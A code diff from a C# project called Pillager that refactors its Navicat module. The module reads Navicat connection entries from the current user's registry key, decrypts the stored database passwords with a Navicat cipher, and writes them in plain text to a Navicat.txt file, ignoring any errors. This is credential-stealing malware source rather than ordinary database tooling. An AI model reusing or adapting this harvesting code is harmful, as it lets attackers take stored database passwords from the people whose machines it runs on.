@@ -6,11 +6,9 @@ using Pillager.Helper;
 
 namespace Pillager.Tools
 {
-    internal class Navicat
+    internal class Navicat : ICommand
     {
-        public static string ToolName = "Navicat";
-
-        public static string DecryptPwd()
+        public string DecryptPwd()
         {
             StringBuilder sb = new StringBuilder();
             Navicat11Cipher Decrypt = new Navicat11Cipher();
@@ -57,16 +55,16 @@ namespace Pillager.Tools
             return sb.ToString();
         }
 
-        public static void Save(string path)
+        public override void Save(string path)
         {
             try
             {
                 var registryKey = Registry.CurrentUser.OpenSubKey(@"Software\PremiumSoft");
                 if (registryKey == null) return;
-                string savepath = Path.Combine(path, ToolName);
+                string savepath = Path.Combine(path, "Navicat");
                 Directory.CreateDirectory(savepath);
                 string output = DecryptPwd();
-                if (!string.IsNullOrEmpty(output)) File.WriteAllText(Path.Combine(savepath, ToolName + ".txt"), output);
+                if (!string.IsNullOrEmpty(output)) File.WriteAllText(Path.Combine(savepath, "Navicat.txt"), output, Encoding.UTF8);
             }
             catch { }
         }
